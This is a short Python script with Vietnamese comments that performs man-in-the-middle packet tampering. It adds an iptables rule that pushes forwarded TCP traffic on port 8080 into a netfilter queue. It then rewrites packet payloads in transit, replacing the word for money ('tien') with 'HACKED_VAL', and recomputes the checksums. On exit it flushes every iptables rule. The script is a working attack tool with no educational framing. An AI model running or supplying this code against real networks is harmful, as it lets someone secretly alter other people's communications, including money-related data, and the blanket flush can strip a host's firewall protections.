
import os
from scapy.all import IP, TCP, Raw
from netfilterqueue import NetfilterQueue

def modify_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())
    
    if scapy_pkt.haslayer(Raw):
        load = scapy_pkt[Raw].load.decode(errors='ignore')
        print(f"[*] Tin nhan goc: {load.strip()}")
        
        # LOGIC THAY DOI DU LIEU: Neu thay chu 'tien', doi thanh 'HACKED'
        if "tien" in load:
            new_load = load.replace("tien", "HACKED_VAL")
            scapy_pkt[Raw].load = new_load
            
            # Xoa checksum de Scapy tinh lai
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            
            pkt.set_payload(bytes(scapy_pkt))
            print(f"[!] DA SUA THANH: {new_load.strip()}")

    pkt.accept()

# Thiet lap iptables de day traffic vao Queue
os.system("iptables -I FORWARD -p tcp --dport 8080 -j NFQUEUE --queue-num 1")
print("[+] Dang cho tin nhan de sua doi...")

try:
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, modify_packet)
    nfqueue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    
